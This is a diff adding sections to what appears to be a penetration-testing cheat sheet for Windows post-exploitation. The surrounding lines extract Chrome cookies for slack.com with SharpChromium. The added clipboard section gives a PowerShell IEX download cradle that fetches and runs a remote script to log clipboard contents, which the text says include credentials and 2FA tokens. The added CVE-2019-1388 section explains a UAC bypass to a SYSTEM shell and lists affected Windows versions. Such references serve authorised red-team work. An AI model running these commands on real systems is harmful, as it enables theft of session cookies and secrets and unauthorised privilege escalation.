@@ -2927,6 +2927,18 @@ Due to a change in the location of the Sqlite db we will need to run the followi
 |`copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"`|Copy file to correct location|
 | `Invoke-SharpChromium -Command "cookies slack.com"`|Invoke SharpChromium extracting slack.com cookie|
 
+---
+
+#### Clipboard 
+
+The clipboard provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard.
+
+We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.
+
+| **Command** | **Description** |
+| --- | ----------- |
+| `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')`| Download using invoke-expression|
+| `Invoke-ClipboardLogger` ||
 
 ---
 #### mRemoteNG
@@ -3525,6 +3537,33 @@ python wes.py -u
 python wes.py systeminfo.txt qfe.txt
 
 powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
+```
+
+### CVE-2019-1388
+
+The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The Issued By field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) 1.3.6.1.4.1.311.2.1.10. This OID value is identified in the wintrust.h header as SPC_SP_AGENCY_INFO_OBJID which is the SpcSpAgencyInfo field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable (hhupd.exe) that contains a certificate with the SpcSpAgencyInfo field populated with a hyperlink.
+
+When we click on the hyperlink, a browser window will launch running as NT AUTHORITY\SYSTEM. Once the browser is opened, it is possible to "break out" of it by leveraging the View page source menu option to launch a cmd.exe or PowerShell.exe console as SYSTEM.
+```
+SERVER
+======
+
+Windows 2008r2	7601	** link OPENED AS SYSTEM **
+Windows 2012r2	9600	** link OPENED AS SYSTEM **
+Windows 2016	14393	** link OPENED AS SYSTEM **
+Windows 2019	17763	link NOT opened
+
+
+WORKSTATION
+===========
+
+Windows 7 SP1	7601	** link OPENED AS SYSTEM **
+Windows 8		9200	** link OPENED AS SYSTEM **
+Windows 8.1		9600	** link OPENED AS SYSTEM **
+Windows 10 1511	10240	** link OPENED AS SYSTEM **
+Windows 10 1607	14393	** link OPENED AS SYSTEM **
+Windows 10 1703	15063	link NOT opened
+Windows 10 1709	16299	link NOT opened
 ```
 
 ### Post exploitation
